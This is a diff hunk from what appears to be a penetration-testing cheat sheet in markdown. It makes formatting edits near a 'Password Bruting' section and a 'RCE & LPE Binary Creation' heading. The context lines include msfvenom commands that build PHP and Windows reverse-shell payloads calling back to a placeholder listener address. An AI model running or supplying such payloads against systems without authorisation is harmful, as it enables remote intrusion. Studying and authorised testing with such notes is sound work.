@@ -77,11 +77,12 @@ Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description
 
 ## Password Bruting
 ```bash
+
 ```
 
 ## Misc
 
-###RCE & LPE Binary Creation
+### RCE & LPE Binary Creation
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw > shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > shell.exe
